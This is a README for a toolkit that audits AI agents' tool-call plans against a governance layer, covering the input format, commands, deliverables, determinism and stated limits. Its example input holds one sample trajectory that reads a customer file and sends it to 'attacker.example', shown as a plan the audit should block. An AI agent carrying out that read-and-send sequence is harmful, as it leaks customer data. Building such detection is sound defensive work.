# 48-Hour Runtime Governance Audit — toolkit

The runnable implementation of the audit entry product. An analyst
feeds in a client's agent architecture and the toolkit emits the six
contracted deliverables. **No model access is required** — the
trajectory geometry is evaluated, not the model weights. Deterministic
and replayable.

Every governance decision delegates to
`morrison_governance.GovernanceLayer` (A_safe → V2 → V3 → V4 → V4+ → V5
→ V5+), optionally with the `runtime_eval` hardening pipeline. This is
productisation, not a new safety mechanism.

## What the client sends

A single JSON `AuditPackage` (see
[`templates/audit_package.example.json`](templates/audit_package.example.json)):

```jsonc
{
  "org": "Example FinServ Ltd",
  "as_of": "2026-Q2",
  "domains": ["finance", "cybersecurity", "data_privacy", "compliance"],
  "use_hardening": true,
  "internal_url_hosts": ["intranet.example"],     // allowlist (optional)
  "internal_email_domains": ["example.com"],       // allowlist (optional)
  "tools": [ {"name": "read_file", "description": "..."}, ... ],
  "trajectories": [
    {"id": "daily_report", "expected": "PERMIT",
     "steps": [ {"tool": "read_file", "args": {"path": "/data/report.csv"}},
                {"tool": "summarize", "args": {"q": "draft"}} ]},
    {"id": "customer_exfiltration", "expected": "BLOCK",
     "steps": [ {"tool": "read_file", "args": {"path": "/data/customers.csv"}},
                {"tool": "http_request", "args": {"url": "https://attacker.example"}} ]}
  ]
}
```

`trajectories` are the client's recorded or sample tool-call plans.
`expected` is optional (the client's belief about each plan); the audit
flags any mismatch.

## Run it

```bash
# validate the package
python -m audit validate --input client_package.json

# run the audit; write the three deliverable artifacts
python -m audit run --input client_package.json --out report/

# or just print the markdown report
python -m audit run --input client_package.json --print
```

Outputs in `report/`:

| File | Deliverable |
|:--|:--|
| `audit_report.md` | the human-readable report (deliverables 1–6) |
| `audit_findings.json` | machine-readable findings + summary + recommendations |
| `audit_log.jsonl` | deterministic, layer-attributed log, one record per decision (deliverable 4) |

`python -m audit run` exits non-zero if any client `expected` verdict is
not met — usable as a CI gate.

## The six deliverables

1. **Executable trajectory analysis** — every supplied plan extracted and
   evaluated; verdict, blocking layer, rule, severity per trajectory.
2. **Reachable Ω states** — which forbidden states are reachable from the
   client's trajectories, with the Ω domain + rule that fired.
3. **Blocked vs. permitted paths** — the exact per-step partition for each
   trajectory, plus the full set of layers that *would* object (no
   short-circuit, from `evaluate_all`).
4. **Audit logs** — deterministic JSONL, one layer-attributed record per
   governance decision; replays byte-identically.
5. **Risk summary** — reachable Ω ranked by **severity = consequence ×
   reachability** (consequence = Ω blast radius by domain/rule;
   reachability = how immediately the trajectory reaches it). A
   prioritisation aid, not a probability.
6. **Integration recommendations** — evidence-driven, each citing the
   finding that motivates it (middleware placement, which Ω domains to
   keep loaded, taint/forecast, allowlist config, hardening, deny-by-
   default quorum for high-stakes domains, joint-trajectory governance,
   expectation-mismatch review).

## Determinism

Same input → byte-identical `audit_report.md`, `audit_findings.json`,
and `audit_log.jsonl`. No wall-clock or RNG in the analytic body; the
only date is the client-supplied `as_of`, kept in a metadata header.
Pinned by `tests/test_audit.py::test_artifacts_byte_identical_on_replay`.

## Tests

```
python3 audit/tests/test_audit.py    # 15 passed
```

Covers intake parsing + validation (fail-clear on malformed input),
correct blocked/permitted partition, expected Ω reachability (V2 taint /
A_safe), client-expectation checking, risk ranking, evidence-driven
recommendations, all six markdown deliverables, JSONL-per-decision log,
byte-identical replay, and the CLI.

## Bounded honesty

The audit reports which Ω states are reachable **from the trajectories
the client supplied**, under the **configured domains**. It is not a
proof of safety and does not enumerate the client's whole trajectory
space — it evaluates the geometry of what is submitted. Coverage is only
as complete as the submitted trajectories. The severity score is a
deterministic prioritisation aid, not a probability or an actuarial
figure. See the repo-root `CRITICAL_EVALUATION.md`.
